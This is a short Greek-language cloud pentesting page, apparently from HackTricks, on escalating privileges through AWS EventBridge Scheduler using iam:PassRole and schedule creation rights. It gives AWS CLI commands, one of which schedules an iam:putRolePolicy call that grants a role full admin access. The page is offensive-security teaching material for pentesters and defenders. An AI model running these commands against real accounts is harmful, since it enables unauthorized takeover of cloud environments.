# AWS - EventBridge Scheduler Privesc

{{#include ../../../banners/hacktricks-training.md}}

## EventBridge Scheduler

Περισσότερες πληροφορίες για το EventBridge Scheduler στο:

{{#ref}}
../aws-services/eventbridgescheduler-enum.md
{{#endref}}

### `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

Ένας επιτιθέμενος με αυτές τις άδειες θα είναι σε θέση να **`δημιουργήσει`|`ενημερώσει` έναν προγραμματιστή και να καταχραστεί τις άδειες του ρόλου προγραμματιστή** που είναι συνδεδεμένος σε αυτόν για να εκτελέσει οποιαδήποτε ενέργεια

Για παράδειγμα, θα μπορούσαν να ρυθμίσουν το πρόγραμμα να **καλέσει μια συνάρτηση Lambda** η οποία είναι μια προτυπωμένη ενέργεια:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
Εκτός από τις προτυπωμένες ενέργειες υπηρεσιών, μπορείτε να χρησιμοποιήσετε **universal targets** στο EventBridge Scheduler για να καλέσετε μια ευρεία γκάμα API λειτουργιών για πολλές υπηρεσίες AWS. Οι universal targets προσφέρουν ευελιξία για να καλέσετε σχεδόν οποιοδήποτε API. Ένα παράδειγμα μπορεί να είναι η χρήση universal targets προσθέτοντας "**AdminAccessPolicy**", χρησιμοποιώντας έναν ρόλο που έχει πολιτική "**putRolePolicy**":
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## Αναφορές

- [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)
- [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{{#include ../../../banners/hacktricks-training.md}}
